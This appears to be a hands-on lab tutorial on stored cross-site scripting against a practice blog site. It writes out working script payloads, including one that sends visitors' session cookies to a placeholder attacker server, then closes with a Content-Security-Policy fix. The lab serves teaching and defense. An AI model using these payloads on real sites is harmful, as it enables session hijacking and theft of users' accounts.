# Let's try out Stored Cross-Site Scripting.

## EXPLORE

The rightmost browser window has a Public Blog Post Site.
To add a new post click the "Add" button and type in the new post content.
After the post is saved in the backend server a new entry in public Blog Post would appear with the content that we just provided.

You can explore and add more posts.

## Exploit

### Step 1:
Now to see if the input is not sanitized properly before storing it in the backend we type in the below code as input for the blog post.
```html
<script>alert('popup text')</script>
```
After you enter the above text you'll get a pop up with text "popup text", which indicates that this public Blog Post is vulnerable to executable javascript via public posts.

### Step 2
This Blog is Vulnerable to many exploits. We focus on Cookie Stealing.

next, to check if the public post has a users session we type the following text as a new blog post.

```html
<script>alert(document.cookie)</script>
```

After you enter the above text you'll see a pop with the cookie.

### Step 3
For Malicious attacker to exploit this vulnerability and save the session cookies of anyone who visits this public post we have to get the cookie and pass it to some hacker server that would store it.
To Simulate such an attack, replace {HACKER_SERVER_HOST} with the IP address of the terminals public IP and post it as a new blog post.

```
<script>document.write('<img src="http://{HACKER_SERVER_HOST}:5000/hacker_server/submit_cookie?cookie='+ escape(document.cookie) + '" />');</script>
```
for ex: 

```
<script>document.write('<img src="http://72.56.45.584:5000/hacker_server/submit_cookie?cookie='+ escape(document.cookie) + '" />');</script>
```

lets break the above text down
- document.write is going to dump it's content as plain text.
- img tag's src contains the endpoint where the hacker server is listening for incomming stolen cookie information.
- the query parameter 'cookie' is used and it's value is escaped to make the cookie value single query value in case the cookie value contains '&'.
- The img src url is going to save the cookie in a text file and serve the blog website an image.

### Step 4
After the above post have been published, anyone who'll visit the Public Blog Post would send their cookie information to hacker_server.
To verify the saved cookies type the following command in the terminal.
```
cat /app/hacker_server/cookies.txt
```
if this Public Blog Post would have had some sensitive user information or some monetary shopping transactions.
then the hacker would be able to [hijack the user session](https://www.netsparker.com/blog/web-security/session-hijacking/#:~:text=Session%20hijacking%20is%20an%20attack,ends%20when%20you%20log%20out.) and do all sorts of harm. 


## Mitigate
The Node.js Server for our Public Blog Post has No [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP). To Enable the CSP do the following
  - navigate to /app/routes/index.js's line number 16 via.
  ```
  vim /app/routes/index.js +16
  ```
  - and uncomment the line with the following code
  ```js
  res.setHeader("Content-Security-Policy", "script-src 'self'");
  ```
  the above line restricts the browser to only execute javascript served from the site's own origin and blocks any inline javascript. Hence mitigating the XSS vulnerability.
